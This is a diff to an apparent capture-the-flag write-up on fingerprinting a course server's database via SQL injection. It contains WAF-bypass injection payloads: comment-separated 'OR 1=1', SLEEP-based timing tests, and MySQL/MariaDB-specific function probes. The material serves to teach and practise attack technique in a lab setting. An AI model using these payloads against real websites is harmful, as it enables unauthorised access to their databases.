@@ -10,9 +10,9 @@ OracleDB|   ?    |   O    | dbms_lock.sleep(sec) | O      |  O     |  O     |  O
 
 ## Step 2 trial and error to determine DB type
 
-### White space banned
+### White space banned (WAF)
 
-`https://edu-ctf.csie.org:10159/video.php?vid=1%20SLEEP(3)` does not work (waf protection for space characters) --> bad cat!, hence we need to use comment to separate commands. 
+`https://edu-ctf.csie.org:10159/video.php?vid=1%20SLEEP(3)` does not work (WAF protection for space characters) --> bad cat!, hence we need to use comment to separate commands. 
 
 ### Check function
 
@@ -27,4 +27,14 @@ OracleDB|   ?    |   O    | dbms_lock.sleep(sec) | O      |  O     |  O     |  O
 
 * `https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/1=1--ljfberwhkfjhwbe`  --> no error!: -- Usable
 
-Finally we can determine the DB Kaibro uses is MariaDB  
+### But is it MySQL or MariaDB?
+
+* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/RELEASE_ALL_LOCKS()` --> bad cat!: WAF prevention and this function is MySQL only.
+* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/MEDIAN()` --> error!: MariaDB only function.
+
+# Finally we can determine the DB that Kaibro uses is MySQL 
+
+[Function Differences Between MariaDB 10.4 and MySQL 8.0](https://mariadb.com/kb/en/library/function-differences-between-mariadb-104-and-mysql-80/)
+
+### SQL injection in MySQL
+
